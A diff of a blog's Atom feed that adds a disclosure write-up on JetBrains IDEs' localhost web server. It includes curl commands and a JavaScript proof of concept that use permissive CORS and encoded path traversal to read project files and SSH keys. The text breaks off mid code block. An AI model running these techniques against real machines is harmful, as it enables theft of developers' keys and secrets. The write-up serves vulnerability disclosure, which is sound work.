@@ -4,7 +4,7 @@
   <title><![CDATA[Defined Misbehaviour]]></title>
   <link href="http://blog.saynotolinux.com/atom.xml" rel="self"/>
   <link href="http://blog.saynotolinux.com/"/>
-  <updated>2015-08-02T16:14:48-07:00</updated>
+  <updated>2016-08-15T07:10:18-07:00</updated>
   <id>http://blog.saynotolinux.com/</id>
   <author>
     <name><![CDATA[Jordan Milne]]></name>
@@ -14,34 +14,622 @@
 
   
   <entry>
-    <title type="html"><![CDATA[Leaking Clipboard Contents With Flash: Let's Explore User-Initiated Actions!]]></title>
-    <link href="http://blog.saynotolinux.com/blog/2015/08/02/pastejacking-abusing-flash-to-leak-and-manipulate-clipboad-contents/"/>
-    <updated>2015-08-02T15:44:46-07:00</updated>
-    <id>http://blog.saynotolinux.com/blog/2015/08/02/pastejacking-abusing-flash-to-leak-and-manipulate-clipboad-contents</id>
-    <content type="html"><![CDATA[<p>(NOTE: This article has been sitting in my drafts since May 2014. I am very lazy.)</p>
+    <title type="html"><![CDATA[JetBrains IDE Remote Code Execution and Local File Disclosure]]></title>
+    <link href="http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/"/>
+    <updated>2016-08-15T00:00:00-07:00</updated>
+    <id>http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis</id>
+    <content type="html"><![CDATA[<h1>TL;DR</h1>
 
-<h2>TL;DR</h2>
+<p>From at least 2013 until May 2016 JetBrains&#8217; IDEs were vulnerable to local file leakage, with the Windows versions additionally being vulnerable to remote code execution. The only prerequisite for the attack was to have the victim visit an attacker-controlled webpage while the IDE was open.</p>
 
-<p>Flash only allows read access to the clipboard in event handlers triggered by <code>paste</code> events, but Flash wasn&rsquo;t checking if the clipboard contents had changed since entering the event handler. Due to quirks in how Flash&rsquo;s event handlers work, an attacker could read from and write to the clipboard for hours after the user navigated away from page containing the SWF, even after navigating away or closing the incognito window.</p>
+<p>Affected IDEs included PyCharm, Android Studio, WebStorm, IntelliJ IDEA and several others.</p>
 
-<p><a href="http://blog.saynotolinux.com/images/posts/flash-clip/clipstealer.gif"><img class="center" src="http://blog.saynotolinux.com/images/posts/flash-clip/clipstealer.gif"></a></p>
+<p>I&rsquo;ve tracked the core of most of these issues (CORS allowing all origins + always-on webserver) <a href="https://github.com/JetBrains/intellij-community/commit/11f333f60cd2fc5b14f8535a2f1d156e90bb372e">back to the addition of the webserver to WebStorm in 2013</a>. It&rsquo;s my belief that all JetBrains IDEs with always-on servers since then are vulnerable to variants of these attacks.</p>
+
+<p>The arbitrary code execution PoC for Windows was in all IDE releases <a href="https://github.com/JetBrains/intellij-community/commit/9c762d305709afa51103dedd48e37c5c727fc80e">since at least July 13, 2015</a>, but was probably exploitable earlier via other means.</p>
 
 <!--more-->
 
 
+<h1>Investigation</h1>
+
+<p>To follow along with this you&rsquo;ll need a copy of PyCharm 5.0.4, or an old build of PyCharm 2016.1 since this has been patched for a while now. Obviously you&rsquo;ll want to do this in a VM.</p>
+
+<ul>
+<li>Linux: <a href="https://download.jetbrains.com/python/pycharm-community-5.0.4.tar.gz">https://download.jetbrains.com/python/pycharm-community-5.0.4.tar.gz</a></li>
+<li>OS X: <a href="https://download.jetbrains.com/python/pycharm-community-5.0.4.dmg">https://download.jetbrains.com/python/pycharm-community-5.0.4.dmg</a></li>
+<li>Windows: <a href="https://download.jetbrains.com/python/pycharm-community-5.0.4.exe">https://download.jetbrains.com/python/pycharm-community-5.0.4.exe</a></li>
+</ul>
+
+
+<h2>Initial Discovery</h2>
+
+<p>I had just started working on some <a href="https://en.wikipedia.org/wiki/Inter-protocol_exploitation">inter-protocol exploitation</a> research and was looking for some interesting targets. Thinking that I must have some interesting services running on my own device, I ran <code>lsof -P -ITCP | grep LISTEN</code> to see what programs were listening on a local TCP port. I got back:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ lsof -P -iTCP | grep LISTEN
+</span><span class='line'># ...
+</span><span class='line'>pycharm   4177 user  289u  IPv4 0x81a02fb90b4eef47      0t0  TCP localhost:63342 (LISTEN)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Hmm, I&rsquo;ve used <a href="https://www.jetbrains.com/pycharm/">PyCharm</a> as my IDE of choice for a while now, but never noticed that it bound to any ports&hellip; Might it be some sort of ad-hoc IPC mechanism? Let&rsquo;s nmap it to figure out what&rsquo;s being sent over those ports, and what the protocol is:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ nmap -A -p 63342 127.0.0.1
+</span><span class='line'># [...]
+</span><span class='line'>PORT      STATE SERVICE VERSION
+</span><span class='line'>63342/tcp open  unknown
+</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+</span><span class='line'>SF-Port63342-TCP:V=6.46%I=7%D=8/2%Time=57A0DD64%P=x86_64-apple-darwin13.1.
+</span><span class='line'>SF:0%r(GetRequest,173,"HTTP/1\.1\x20404\x20Not\x20Found\r\ncontent-type:\x
+</span><span class='line'># [...]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looks like an HTTP server? Unusual for a local application&hellip; Let&rsquo;s see what CORS headers it serves up with responses:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ curl -v -H "Origin: http://attacker.com/" "http://127.0.0.1:63342/"
+</span><span class='line'>&gt; GET / HTTP/1.1
+</span><span class='line'>&gt; Host: 127.0.0.1:63342
+</span><span class='line'>&gt; User-Agent: curl/7.43.0
+</span><span class='line'>&gt; Accept: */*
+</span><span class='line'>&gt; Origin: http://attacker.com/
+</span><span class='line'>&gt; 
+</span><span class='line'>&lt; HTTP/1.1 404 Not Found
+</span><span class='line'>[...]
+</span><span class='line'>&lt; access-control-allow-origin: http://attacker.com/
+</span><span class='line'>&lt; vary: origin
+</span><span class='line'>&lt; access-control-allow-credentials: true
+</span><span class='line'>&lt; access-control-allow-headers: authorization
+</span><span class='line'>&lt; access-control-allow-headers: origin
+</span><span class='line'>&lt; access-control-allow-headers: content-type
+</span><span class='line'>&lt; access-control-allow-headers: accept
+</span><span class='line'>&lt; 
+</span><span class='line'>* Connection #0 to host 127.0.0.1 left intact
+</span><span class='line'>&lt;!doctype html&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;h1 style="text-align: center"&gt;404 Not Found&lt;/h1&gt;&lt;hr/&gt;&lt;p style="text-align: center"&gt;PyCharm 5.0.4&lt;/p&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Something smells off here. <a href="https://github.com/JetBrains/intellij-community/blob/10a4c91dbfca935b4b5531003fd8c13b56e66202/platform/platform-impl/src/org/jetbrains/io/NettyUtil.java#L237-L243">PyCharm&rsquo;s HTTP server is essentially saying</a> that web pages on any origin (including <code>http://attacker.com</code>) are allowed to make credentialed requests to it and read the response. What the heck is this HTTP server, though? Does it serve anything sensitive? Do we even care if random pages are able to read its contents?</p>
+
+<h2>What&rsquo;s that HTTP server?</h2>
+
+<p>After searching the web for references to that port number, we find that this is related to a <a href="http://blog.jetbrains.com/webide/2013/03/built-in-server-in-webstorm-6/">WebStorm feature added in early 2013</a> (WebStorm is another of JetBrains&#8217; IDEs.) The idea was that you wouldn&rsquo;t need to set up your own web server to preview your pages in a browser. You could just click a &ldquo;view in browser&rdquo; button inside WebStorm and it would navigate your browser to <code>http://localhost:63342/&lt;projectname&gt;/&lt;your_file.html&gt;</code>. Any scripts or subresources that the page tried to include would similarly be served up via URLs like <code>http://localhost:63342/&lt;projectname&gt;/some_script.js</code>. Fancy.</p>
+
+<p>To verify that PyCharm embeds the same server as WebStorm, let&rsquo;s create a project named &ldquo;testing&rdquo; in PyCharm and place a file named &ldquo;something.txt&rdquo; in the root and see if we can fetch it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ curl -v -H "Origin: http://attacker.com/" "http://127.0.0.1:63342/testing/something.txt"
+</span><span class='line'>&gt; GET /testing/something.txt HTTP/1.1
+</span><span class='line'>&gt; Host: 127.0.0.1:63342
+</span><span class='line'>&gt; User-Agent: curl/7.43.0
+</span><span class='line'>&gt; Accept: */*
+</span><span class='line'>&gt; Origin: http://attacker.com/
+</span><span class='line'>&gt; 
+</span><span class='line'>&lt; HTTP/1.1 200 OK
+</span><span class='line'>[...]
+</span><span class='line'>&lt; access-control-allow-origin: http://attacker.com/
+</span><span class='line'>[...]
+</span><span class='line'>these are the file contents!</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Yikes, so any site can read any of your project files so long as they can guess the project name and filename. This would obviously include any in-tree configuration files that contained secrets like AWS keys and the like. Here&rsquo;s an HTML snippet we could include on <code>attacker.com</code> that would do the same thing as our cURL command:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span><span class='line'><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;http://localhost:63342/testing/something.txt&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span><span class='line'><span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">alert</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)};</span>
+</span><span class='line'><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span><span class='line'><span class="nt">&lt;/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is pretty bad, but as-is this would mostly be useful for targeted attacks. It&rsquo;s a pain to have to guess at directory structures to get at the interesting files, so what are some ways we can weaponize this?</p>
+
+<h1>Weaponization</h1>
+
+<h2>Escaping from the project directory</h2>
+
+<p>Let&rsquo;s see if we can read files <em>outside</em> of the project directory. There are some files (like SSH keys, etc) that live at standard locations and are interesting for an attacker. Much more interesting than possible credentials for some database that might not even be accessible to us.</p>
+
+<p>The obvious thing to do is see how it handles dot segments in the request URI:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -v <span class="s2">&quot;http://localhost:63342/testing/../../../.ssh/id_rsa.pub&quot;</span>
+</span><span class='line'>* Rebuilt URL to: http://localhost:63342/.ssh/id_rsa.pub
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Bah. <a href="https://tools.ietf.org/html/rfc3986#section-5.2.4">Per the spec</a> dot segments in paths must be normalized away by either the client or the server. cURL&rsquo;s behaviour here is the same as you’d see in a browser. Luckily PyCharm&rsquo;s internal HTTP server treats dot segments with urlencoded <code>/</code>s like <code>%2F..%2F</code> as semantically equivalent to the unencoded <code>/../</code> form, and browsers will not normalize those away.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -v <span class="s2">&quot;http://localhost:63342/testing/..%2f..%2f.ssh/id_rsa.pub&quot;</span>
+</span><span class='line'>&gt; GET /testing/..%2f..%2f.ssh/id_rsa.pub HTTP/1.1
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>&gt;
+</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
+</span><span class='line'>&lt; content-type: application/octet-stream
+</span><span class='line'>&lt; server: PyCharm 5.0.4
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>&lt;
+</span><span class='line'>ssh-rsa AAAAB3NzaC<span class="o">[</span>...<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>Great success! Our only limitation here is that we <em>must</em> know the name of a project the victim has open. Requesting <code>/invalidproject/&lt;anything&gt;</code> will always 404.</p>
+
+<p>The obvious choice is to use a dictionary of potential project names a user could have open, and try to request <code>/&lt;potential_projectname&gt;/.idea/workspace.xml</code> (which is a metadata file automatically added to most JetBrains projects.)</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --head <span class="s2">&quot;http://localhost:63342/testing/.idea/workspace.xml&quot;</span>
+</span><span class='line'>HTTP/1.1 <span class="m">200</span> OK
+</span><span class='line'><span class="nv">$ </span>curl --head <span class="s2">&quot;http://localhost:63342/somethingelse/.idea/workspace.xml&quot;</span>
+</span><span class='line'>HTTP/1.1 <span class="m">404</span> Not Found
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We got a 200 for <code>testing</code>, so we know it&rsquo;s a valid project.</p>
+
+<p>A naive PoC for this in JavaScript:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">findLoadedProject</span><span class="p">(</span><span class="nx">cb</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span><span class='line'>  <span class="c1">// Let&#39;s assume we have a sensible dictionary here.</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">possibleProjectNames</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;foobar&quot;</span><span class="p">,</span> <span class="s2">&quot;testing&quot;</span><span class="p">,</span> <span class="s2">&quot;bazquux&quot;</span><span class="p">];</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">tryNextProject</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">possibleProjectNames</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="nx">cb</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="kd">var</span> <span class="nx">projectName</span> <span class="o">=</span> <span class="nx">possibleProjectNames</span><span class="p">.</span><span class="nx">pop</span><span class="p">();</span>
+</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;http://localhost:63342/&quot;</span> <span class="o">+</span> <span class="nx">projectName</span> <span class="o">+</span> <span class="s2">&quot;/.idea/workspace.xml&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nx">cb</span><span class="p">(</span><span class="nx">projectName</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nx">tryNextProject</span><span class="p">();</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>    <span class="p">};</span>
+</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span><span class='line'>  <span class="p">};</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">findSSHKeys</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">projectName</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">depth</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">tryNextDepth</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>    <span class="c1">// No luck, SSH directory doesn&#39;t share a parent</span>
+</span><span class='line'>    <span class="c1">// directory with the project.</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">++</span><span class="nx">depth</span> <span class="o">&gt;</span> <span class="mi">15</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="c1">// Chances are that both `.ssh` and the project directory are under the user&#39;s home folder,</span>
+</span><span class='line'>    <span class="c1">// let&#39;s try to walk up the dir tree.</span>
+</span><span class='line'>    <span class="nx">dotSegs</span> <span class="o">=</span> <span class="s2">&quot;..%2f&quot;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="nx">depth</span><span class="p">);</span>
+</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;http://localhost:63342/&quot;</span> <span class="o">+</span> <span class="nx">projectName</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span> <span class="o">+</span> <span class="nx">dotSegs</span> <span class="o">+</span> <span class="s2">&quot;.ssh/id_rsa.pub&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nx">tryNextDepth</span><span class="p">();</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>    <span class="p">};</span>
+</span><span class='line'>    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">findLoadedProject</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">projectName</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nx">projectName</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">projectName</span><span class="p">,</span> <span class="s2">&quot;is a valid project, looking for SSH key&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="nx">findSSHKeys</span><span class="p">(</span><span class="nx">projectName</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Failed to guess a project name&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">});</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There&rsquo;s no rate-limiting, and I was able to try about 2000 project names a second using this method with Chrome even on my older laptop.</p>
+
+<h2>Can we get around having to guess a project name?</h2>
+
+<p>At this point, I started looking at the various APIs that PyCharm exposed via the same webserver. Having to guess a valid, open project name to leak files is a big mitigating factor, and the API might give us a way around that.</p>
+
+<p>Eventually I came upon the <code>/api/internal</code> internal endpoint, which corresponds to <a href="https://github.com/JetBrains/intellij-community/blob/10a4c91dbfca935b4b5531003fd8c13b56e66202/platform/built-in-server/src/org/jetbrains/ide/JetBrainsProtocolHandlerHttpService.java"><code>JetBrainsProtocolHandlerHttpService</code></a>. Apparently this lets you pass in a JSON blob containing a URL with a <code>jetbrains:</code> scheme, and the IDE will do something special with it. As far as I can tell, none of the IDEs actually install a systemwide handler for those URLs, and those URLs are undocumented. In any case, let&rsquo;s look for some interesting <code>jetbrains:</code> URLs we can pass it.</p>
+
+<p>The <a href="https://github.com/JetBrains/intellij-community/blob/10a4c91dbfca935b4b5531003fd8c13b56e66202/platform/platform-impl/src/com/intellij/openapi/project/impl/JBProtocolOpenProjectCommand.java"><code>jetbrains://&lt;project_name&gt;/open/&lt;path&gt;</code> handler</a> seems promising:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">JBProtocolOpenProjectCommand</span> <span class="kd">extends</span> <span class="n">JBProtocolCommand</span> <span class="o">{</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="nf">JBProtocolOpenProjectCommand</span><span class="o">()</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">super</span><span class="o">(</span><span class="s">&quot;open&quot;</span><span class="o">);</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nd">@Override</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">perform</span><span class="o">(</span><span class="n">String</span> <span class="n">target</span><span class="o">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">parameters</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>    <span class="n">String</span> <span class="n">path</span> <span class="o">=</span> <span class="n">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">target</span><span class="o">);</span>
+</span><span class='line'>    <span class="n">path</span> <span class="o">=</span> <span class="n">StringUtil</span><span class="o">.</span><span class="na">trimStart</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">LocalFileSystem</span><span class="o">.</span><span class="na">PROTOCOL_PREFIX</span><span class="o">);</span>
+</span><span class='line'>    <span class="n">ProjectUtil</span><span class="o">.</span><span class="na">openProject</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This lets us open a project by passing in its absolute path. The <code>/etc</code> directory exists on most *NIX-like systems, let&rsquo;s try opening that:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl <span class="s2">&quot;http://127.0.0.1:63342/api/internal&quot;</span> --data <span class="s1">&#39;{&quot;url&quot;: &quot;jetbrains://whatever/open//etc&quot;}&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://blog.saynotolinux.com/images/posts/jetbrains/open_etc.png"></p>
+
+<p>Dang, so the directory needs to actually contain a JetBrains-style project, we can&rsquo;t just pass any old directory. Lucky for us, PyCharm 2016.1 and above ship with a JetBrains-style project in their system folder! Under OS X this will be in <code>/Applications/PyCharm.app/Contents/helpers</code>, let&rsquo;s try that:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -v <span class="s2">&quot;http://127.0.0.1:63342/api/internal&quot;</span> --data <span class="s1">&#39;{&quot;url&quot;: &quot;jetbrains://whatever/open//Applications/PyCharm.app/Contents/helpers&quot;}&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://blog.saynotolinux.com/images/posts/jetbrains/helpers_project.png"></p>
+
+<p>Bingo. Now we don&rsquo;t have to guess at an open project name as we now know the <code>helpers</code> project is open. There&rsquo;s no standard location for PyCharm&rsquo;s root folder under Linux (it&rsquo;s wherever the user happened to un<code>tar</code> it to,) but we can determine it by reqesting <code>/api/about?more=true</code> and looking at the <code>homePath</code> key:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
